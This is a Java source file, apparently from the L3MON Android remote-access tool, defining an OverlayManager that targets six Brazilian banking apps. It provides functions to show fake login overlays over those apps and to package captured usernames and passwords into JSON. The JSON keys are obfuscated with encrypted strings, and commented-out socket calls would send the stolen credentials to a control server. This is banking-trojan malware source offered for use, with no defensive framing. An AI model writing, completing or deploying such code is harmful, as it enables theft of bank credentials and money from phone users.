package com.etechd.l3mon.managers;

import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONObject;

import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Timer;
import java.util.TimerTask;

import com.etechd.l3mon.StringCrypto;

public class OverlayManager {

    private static final Map<String, String> BANK_PACKAGES = new HashMap<>();
    private static final List<String> activeOverlays = new ArrayList<>();
    private static boolean overlayMonitoringEnabled = false;
    private static Timer overlayTimer;

    static {
        BANK_PACKAGES.put("itau", "com.itau");
        BANK_PACKAGES.put("bradesco", "com.bradesco");
        BANK_PACKAGES.put("caixa", "com.caixa");
        BANK_PACKAGES.put("nubank", "com.nubank");
        BANK_PACKAGES.put("bb", "com.bb");
        BANK_PACKAGES.put("santander", "com.santander");
    }

    public void enableOverlayMonitoring() {
        overlayMonitoringEnabled = true;
        startMonitoring();
    }

    public void disableOverlayMonitoring() {
        overlayMonitoringEnabled = false;
        if (overlayTimer != null) {
            overlayTimer.cancel();
            overlayTimer = null;
        }
    }

    private void startMonitoring() {
        if (overlayTimer != null)
            overlayTimer.cancel();

        overlayTimer = new Timer();
        overlayTimer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                // Aqui você chamaria o método de monitoramento do serviço
                // Exemplo: monitorForegroundApp();
            }
        }, 0, 2000);
    }

    public void showFakeOverlay(String bankName, String packageName) {
        try {
            JSONObject event = new JSONObject();

            // === CHAVES JSON CRIPTOGRAFADAS ===
            event.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "show_overlay"); // "action"
            event.put(StringCrypto.d("b154d5rAz4A5cTVeIwwlGg=="), bankName.toUpperCase()); // "appName"
            event.put(StringCrypto.d("Ca1KRioPEFMViEClN0e4rg=="), packageName); // "packageName"
            event.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true); // "success"
            event.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"

            // Enviar para servidor (quando descomentar, use o evento criptografado)
            // String eventOI = StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="); // 0xOI
            // ConnectionManager.ioSocket.emit(eventOI, event);

            activeOverlays.add(bankName.toLowerCase());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public void captureCredentials(String bankName, String username, String password) {
        try {
            JSONObject event = new JSONObject();

            // === CHAVES JSON CRIPTOGRAFADAS ===
            event.put(StringCrypto.d("Hdigp18HWeYiSEB5+t0JwA=="), "capture_credentials"); // "action"
            event.put(StringCrypto.d("b154d5rAz4A5cTVeIwwlGg=="), bankName); // "appName"
            event.put(StringCrypto.d("KYySL2f7hb2Jfz0mpUztvw=="), username); // "username"
            event.put(StringCrypto.d("Jy5jW50bgS6lqjqpYWApfQ=="), password); // "password"
            event.put(StringCrypto.d("4yuOO5qONHXaQtr0xSj9kA=="), true); // "success"
            event.put(StringCrypto.d("MUMx/1PSEfguKePeyFz3eQ=="), System.currentTimeMillis()); // "timestamp"

            // ConnectionManager.ioSocket.emit(StringCrypto.d("ODtTeIP/SH8O+VFHE+5qCA=="),
            // event); // 0xOI

            activeOverlays.remove(bankName.toLowerCase());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}